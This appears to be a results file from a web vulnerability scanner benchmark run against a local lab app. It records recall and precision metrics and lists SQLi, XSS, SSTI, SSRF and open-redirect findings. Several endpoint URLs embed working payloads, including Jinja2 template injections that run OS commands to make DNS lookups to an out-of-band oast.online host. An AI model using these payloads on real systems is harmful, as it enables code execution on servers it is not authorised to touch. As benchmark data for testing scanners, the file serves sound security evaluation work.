@@ -1,0 +1,173 @@
+{
+  "benchmark": "HUNTR core benchmark v1",
+  "generated": 1791162946.4560404,
+  "aggregate": {
+    "suites": 1,
+    "overall_recall": 1.0,
+    "overall_ev_recall": 1.0,
+    "total_expected": 5,
+    "total_found": 5,
+    "total_findings": 16,
+    "noise_ratio": 3.2,
+    "unknown_submit_findings": 0
+  },
+  "results": [
+    {
+      "suite": "local-lab",
+      "target": "127.0.0.1:8980",
+      "endpoints": 6,
+      "expected": 5,
+      "found": 5,
+      "total_findings": 16,
+      "recall": 1.0,
+      "precision": 0.312,
+      "noise_ratio": 3.2,
+      "ev_recall": 1.0,
+      "real_routed_to_submit": 5,
+      "dup_of_known": 11,
+      "truly_unknown": 0,
+      "unknown_submit_findings": 0,
+      "chains": 3,
+      "chain_names": [
+        "anon \u2192 account takeover",
+        "anon \u2192 cloud role",
+        "anon \u2192 pii read"
+      ],
+      "pipeline_ev": 15513,
+      "coverage": 94,
+      "status": "done",
+      "detail": [
+        {
+          "class": "sqli",
+          "path": "/product",
+          "param": "id",
+          "sev": "c",
+          "found": true,
+          "verdict": "confirmed",
+          "reco": "submit",
+          "ev": 2658
+        },
+        {
+          "class": "xss",
+          "path": "/search",
+          "param": "q",
+          "sev": "m",
+          "found": true,
+          "verdict": "confirmed",
+          "reco": "submit",
+          "ev": 938
+        },
+        {
+          "class": "redirect",
+          "path": "/go",
+          "param": "url",
+          "sev": "m",
+          "found": true,
+          "verdict": "confirmed",
+          "reco": "submit",
+          "ev": 273
+        },
+        {
+          "class": "ssti",
+          "path": "/greet",
+          "param": "name",
+          "sev": "c",
+          "found": true,
+          "verdict": "confirmed",
+          "reco": "submit",
+          "ev": 2658
+        },
+        {
+          "class": "ssrf",
+          "path": "/fetch",
+          "param": "url",
+          "sev": "h",
+          "found": true,
+          "verdict": "confirmed",
+          "reco": "submit",
+          "ev": 273
+        }
+      ],
+      "unexpected": [
+        {
+          "title": "SQL injection \u2014 id",
+          "cls": "SQLi",
+          "endpoint": "http://127.0.0.1:8980/product?id=1",
+          "reco": "submit",
+          "ev": 2658
+        },
+        {
+          "title": "Verified XSS \u2014 url",
+          "cls": "XSS",
+          "endpoint": "http://127.0.0.1:8980/go?url=/product?id=1",
+          "reco": "submit",
+          "ev": 938
+        },
+        {
+          "title": "Verified XSS \u2014 name",
+          "cls": "XSS",
+          "endpoint": "http://127.0.0.1:8980/greet?name=guest",
+          "reco": "submit",
+          "ev": 938
+        },
+        {
+          "title": "Verified XSS \u2014 id",
+          "cls": "XSS",
+          "endpoint": "http://127.0.0.1:8980/product?id=1",
+          "reco": "submit",
+          "ev": 938
+        },
+        {
+          "title": "Open Redirect Bypass \u2014 parameter",
+          "cls": "Open Redirect Bypass",
+          "endpoint": "http://127.0.0.1:8980/go?url=//oast.me",
+          "reco": "submit",
+          "ev": 273
+        },
+        {
+          "title": "SSTI \u2014 Jinja2 - Out of Band Template Injection",
+          "cls": "SSTI",
+          "endpoint": "http://127.0.0.1:8980/greet?name=guest{{self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup+-type=SRV+db1fjmti4btu42q5oti0tnniqznsadf1g.oast.online').read()}}",
+          "reco": "submit",
+          "ev": 938
+        },
+        {
+          "title": "SSTI \u2014 Reflected SSTI Arithmetic Based",
+          "cls": "SSTI",
+          "endpoint": "http://127.0.0.1:8980/greet?name=guest{{4748*6989}}",
+          "reco": "submit",
+          "ev": 273
+        },
+        {
+          "title": "XSS \u2014 Reflected Cross-Site Scripting",
+          "cls": "XSS",
+          "endpoint": "http://127.0.0.1:8980/greet?name=guest'%22%3E%3C54276%3E",
+          "reco": "submit",
+          "ev": 273
+        },
+        {
+          "title": "XSS \u2014 Reflected Cross-Site Scripting",
+          "cls": "XSS",
+          "endpoint": "http://127.0.0.1:8980/search?q=hello'%22%3E%3C54276%3E",
+          "reco": "submit",
+          "ev": 273
+        },
+        {
+          "title": "XSS \u2014 Reflected Cross-Site Scripting",
+          "cls": "XSS",
+          "endpoint": "http://127.0.0.1:8980/product?id=1'%22%3E%3C54276%3E",
+          "reco": "submit",
+          "ev": 273
+        },
+        {
+          "title": "SSTI \u2014 Jinja2 - Out of Band Template Injection",
+          "cls": "SSTI",
+          "endpoint": "http://127.0.0.1:8980/greet?name=guest{{+cycler.__init__.__globals__.os.popen('nslookup+-type=SRV+db1fjmti4btu42q5oti0qapfaq4c458fg.oast.online').read()+}}",
+          "reco": "submit",
+          "ev": 938
+        }
+      ],
+      "elapsed_sec": 260
+    }
+  ]
+}
